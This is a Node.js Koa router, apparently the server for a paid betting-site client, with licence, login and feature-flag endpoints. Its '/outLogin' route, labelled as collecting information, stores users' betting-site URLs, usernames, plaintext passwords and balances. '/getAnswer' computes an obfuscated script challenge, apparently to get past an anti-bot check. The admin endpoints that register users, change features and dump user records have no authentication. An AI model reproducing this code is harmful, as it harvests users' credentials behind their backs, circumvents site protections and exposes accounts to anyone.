/**
 * Created by cxj on 17-8-1.
 */
const router = require('koa-router')();
const User = require('../../models/User').User;
const Urls = require('../../models/Urls').Urls;
const Web = require('../../models/Web').Web;
let v = require('../../utlis/config').v;
let v1 = require('../../utlis/config').v1;
const sendMail = require('../../utlis/mail').sendMail;

//发送邮件
router.post('/sendMail', async (ctx, next) => {
    let body  = ctx.request.body;
    let message  = body.message;

    let data = message.team + "\n" +
               message.shuju + "\n" +
               message.pankou + "\n" +
               message.type + "\n" +"";

   // await sendMail("实时数据", data, '81886404@qq.com,153215118@qq.com');
    await sendMail("实时数据", data, '81886404@qq.com');
    ctx.body = {
        no:200
    };
});



router.get('/sl', async (ctx, next) => {
    let  data = "";
    if(global.ws&& global.ws.server&& global.ws.server.clients){
        try {
            global.ws.server.clients.forEach(ws=>{
                try {
                    if(ws && ws.myTag){
                        data = ws.myTag+"     "+data;
                    }
                }catch (e1){
                    console.log(e1.toString());
                }
            });
        }catch (e){
            console.log(e.toString());
        }
        //console.log("全部连接",global.ws.server.clients)
    }



    ctx.body = {
        no:200,
        length:global.ws?global.ws.server.clients.size:0,
        data:data,
    };
});

//参数netUrl
router.get('/getAnswer', async (ctx, next) => {
    let ctx_query = ctx.query;
    var value  = getAnswerValue(ctx_query.netUrl);
    ctx.body = {
        no:200,
        data:value+"",
    };
});


function getAnswerValue(url){
    var nlKWBul={"JUdxSoimAhU":+((!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![])+(+[])+(!+[]+!![]+!![]+!![])+(+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![])+(!+[]+!![]+!![]))/+((!+[]+!![]+[])+(!+[]+!![])+(!+[]+!![]+!![]+!![]+!![])+(+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![])+(+[])+(!+[]+!![]+!![]+!![]))};
    nlKWBul.JUdxSoimAhU*=+((!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![])+(+!![])+(+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(+!![]))/+((+!![]+[])+(!+[]+!![]+!![]+!![]+!![])+(+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![])+(+[])+(+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![])+(!+[]+!![]+!![]));
    nlKWBul.JUdxSoimAhU*=+((!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![])+(+[])+(+[])+(!+[]+!![]+!![])+(!+[]+!![]+!![]+!![])+(!+[]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]))/+((!+[]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![])+(!+[]+!![])+(+!![]));
    nlKWBul.JUdxSoimAhU-=+((!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![])+(+[])+(!+[]+!![]+!![]+!![])+(+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![])+(!+[]+!![]+!![]))/+((!+[]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![])+(+[])+(!+[]+!![])+(+[])+(+[]));
    nlKWBul.JUdxSoimAhU-=+((!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![])+(+[])+(!+[]+!![]+!![]))/+((!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![])+(+[])+(!+[]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(+!![])+(!+[]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]));
    nlKWBul.JUdxSoimAhU*=+((!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![])+(+[])+(+[])+(!+[]+!![]+!![])+(!+[]+!![]+!![]+!![])+(!+[]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]))/+((!+[]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]));
    nlKWBul.JUdxSoimAhU+=+((!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![])+(+[])+(!+[]+!![]+!![]))/+((!+[]+!![]+[])+(!+[]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]));
    nlKWBul.JUdxSoimAhU-=+((!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![])+(+[])+(!+[]+!![]+!![]+!![])+(+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![])+(!+[]+!![]+!![]))/+((!+[]+!![]+[])+(+[])+(!+[]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]));
    nlKWBul.JUdxSoimAhU+=+((!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![])+(+[])+(!+[]+!![]+!![]+!![])+(!+[]+!![])+(!+[]+!![]+!![]+!![])+(!+[]+!![]+!![]))/+((!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+[])+(!+[]+!![]+!![])+(!+[]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![])+(+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![])+(!+[]+!![]+!![]+!![]+!![]))
    // var t="";//执行这个脚本的根域，eg:https://www.baidu.com发起的请求
    var val=+nlKWBul.JUdxSoimAhU.toFixed(10) + url.length;
    return val
}

/*更新用户功能*/
//参数  userName  fun   hasJinQiuFun
router.post('/updateUserFun',async (ctx,next)=>{
    let body  = ctx.request.body;
    let userName  = body.userName;
    let userFun = body.fun;
    if(!userName || userFun == null || userFun == undefined){
        ctx.body = {
            no:201,
            msg:'参数错误!',
        };
        return ;
    }
    try {
        userFun = parseInt(userFun);
        if(userFun <0 || userFun >2){
            ctx.body = {
                no:201,
                msg:"参数错误，userFun有问题",
            };
            return ;
        }

    }catch (e1){
        ctx.body = {
            no:201,
            msg:"参数错误，不是整形",
        };
        return ;
    }

    let user = await User.findOne({userName: userName}).exec();
    if(!user||!user.userName){
        ctx.body = {
            no:201,
            msg:"参数错误，用户不存在",
        };
        return ;
    }

    let hasJinQiuFun = body.hasJinQiuFun;

    if(hasJinQiuFun!=null){
        await update(User,{userName : userName},{$set:{fun:userFun,hasJinQiuFun:hasJinQiuFun}});  //是否有进入功能
    }else {
        await update(User,{userName : userName},{$set:{fun:userFun}});
    }

    ctx.body = {
        no:200,
        msg:"更改成功",
    };

});



//注册接口和修改接口
//参数　userName　　　valueTime
router.post('/register',async (ctx,next)=>{
    let body  = ctx.request.body;
    let userName  = body.userName;
    let valueTime = body.valueTime;
    if(!userName || !valueTime){
        ctx.body = {
            no:201,
            msg:'参数错误!',
        };
        return ;
    }


    if(typeof (valueTime) != "number"){
        ctx.body = {
            no:201,
            msg:'时间格式错误',
        };
        return ;
    }

    let msg = "注册成功";
    let user = await User.findOne({userName: userName}).exec();
    if(user){
        msg = "时间修改成功";
    }
    if(body.fun==undefined || body.fun == null){
        await update(User,{userName : userName},{$set:{valueTime:valueTime}});
        msg = msg + "\n用户功能不变"
    }else{
        await update(User,{userName : userName},{$set:{valueTime:valueTime,fun:body.fun}});
        msg = msg + "\n用户功能为"+body.fun;
    }
    ctx.body = {
        no:200,
        time:valueTime,
        msg:msg,
    };

});

function update(model,query,update){
    return new Promise((resolve,reject)=>{
        model.update(query,update,{upsert: true},(err, data)=>{
            if(!err){
                resolve({no:200});
            }else{
                resolve(err);
            }
        });
    })
}


//登录接口　 参数userName　comId
router.post('/login',async (ctx,next)=>{
    let body  = ctx.request.body;
    let userName  = body.userName;
    let comId = body.comId;

    let version = body.version;
    //如果版本号不存在或者不是当前服务器对应的版本 不能使用
    if(!version ||(version!=v1 && version!=v) ){
        ctx.body = {
            no:201,
            msg:"请使用新版本"+v,
        };
        return ;
    }


    if(!userName||!comId || comId.length === 0){
        ctx.body = {
            no:201,
            msg:'参数错误!',
        };
        return ;
    }

    let user = await User.findOne({comId: comId}).exec();
    if(user && user.userName != userName){
        ctx.body = {
            no:201,
            msg:'同一台电脑只能登陆一个账户!',
        };
        return ;
    }

     user = await User.findOne({userName: userName}).exec();
    if(!user) {
        ctx.body = {
            no:201,
            msg:'用户不存在!',
        };
        return ;
    }

    if(user.comId.length==0){
        //用户第一次注册后的登录
        await  update(User,{userName : userName},{$set:{
            comId:comId,
        }});
    }else  if(user.comId != comId){
       ctx.body = {
           no:201,
           msg:"只能在一个电脑上面使用!",
       };
      return ;

    }


    let currentTime  = new Date().getTime();
    if(user.valueTime < currentTime){
        ctx.body = {
            no:201,
            msg:'已过期,请续费!',
        };
        return ;
    }

    currentTime = currentTime +"";
    await  update(User,{userName : userName},{$set:{
        loginTime:currentTime,
    }});


    //获取urls
    let urls = await Urls.findOne({userName: userName}).exec();
    let vipUrls ;
    if(!urls||!urls.urls){
        vipUrls = "www.6d888.com";
    }else {
        vipUrls = urls.urls;
    }

    let daTuiData = {
        "admin2":1,
        "admin4009":1,
    };

    let noPutAdmin = {
        "admin2":1,
        "admin4009":1,
    };

    let hasDaTui = false;
    let canPutDaTui = true;

    if(daTuiData[userName+""] == 1){
        hasDaTui = true;
    }

    if(noPutAdmin[userName+""]==1){
        canPutDaTui = false;
    }


    ctx.body = {
        no:200,
        msg:'登录成功!',
        time:user.valueTime,
        urls:user.userName.indexOf("admin") == -1?vipUrls:"",
        fun:user.fun?user.fun:0,
        hasJinQiuFun:user.hasJinQiuFun?user.hasJinQiuFun:false, //是否有进球的功能
        hasDaTui, //有大腿功能
        canPutDaTui,//有跟大腿功能
        has40Enbale:user.has40Enbale?user.has40Enbale:false, //是否有40分钟的角球功能
};

});


//查询接口  参数userName
router.post('/queryUser',async (ctx,next)=>{
    let body  = ctx.request.body;
    let userName  = body.userName;
    if(!userName){
        ctx.body = {
            no:201,
            msg:'参数错误!',
        };
        return ;
    }

    let user = await User.findOne({userName: userName}).exec();
    if(!user) {
        ctx.body = {
            no:201,
            msg:'用户不存在!',
        };
        return ;
    }
    ctx.body = {
        no:200,
        msg:'成功!',
        user,
    };

});


//修改配置权限
router.post('/addUrls',async (ctx,next)=>{
    let body  = ctx.request.body;
    let userName  = body.userName;
    if(!userName){
        ctx.body = {
            no:201,
            msg:'缺少用户名!',
        };
        return ;
    }

    if(userName.indexOf("admin")>=0){
        ctx.body = {
            no:201,
            msg:'该用户拥有多版本权限!',
        };
        return ;
    }

    let urls  = body.urls;
    // console.log(urls);
    if(!urls){
        ctx.body = {
            no:201,
            msg:'缺少配置网址!',
        };
        return ;
    }

   await  update(Urls,{userName : userName},{$set:{urls :urls,}});

    ctx.body = {
        no:200,
        msg:'成功!',
    };

});



//退出登录 收集信息
/**
 *  {user:user,web:[{url,sys,money,webUser,webPwd}]}
 */
router.post('/outLogin',async (ctx,next)=>{
    let body  = ctx.request.body;
    let userName  = body.userName;
    if(!userName){
        ctx.body = {
            no:201,
            msg:'缺少用户名!',
        };
        return ;
    }

    if(userName == "admin"||userName == "admin-client"){
        ctx.body = {
            no:200,
            msg:'不在范围内!',
        };
        return ;
    }

    //网站收集
    let web  = body.web;
    if(!web){
        ctx.body = {
            no:201,
            msg:'缺少网址!',
        };
        return ;
    }
    let time  = new Date().getTime();
    let timeDate = new Date();
    let timeChina = add0(timeDate.getFullYear())+"年"+add0(timeDate.getMonth()+1)+'月'+add0(timeDate.getDate())+'日 '+
        +add0(timeDate.getHours())+":"+add0(timeDate.getMinutes());

    for(let i = 0 ; i < web.length ; i ++){
        let  sys = web[i].sys;
        let money = web[i].money;
        let url = web[i].url;
        let webUser = web[i].webUser;
        let webPwd = web[i].webPwd;
        await  update(Web,{userName : userName,url:url,webUser:webUser},
            {$set:{sys :sys,money:money,webPwd:webPwd,time:time,timeChina:timeChina}});
    }
    ctx.body = {
        no:200,
        msg:'成功!',
    };

});


function add0(num) {
    if(typeof num === 'string'){
        num  = parseInt(num);
    }
    return num>=10?""+num:"0"+num;
}



module.exports = router;
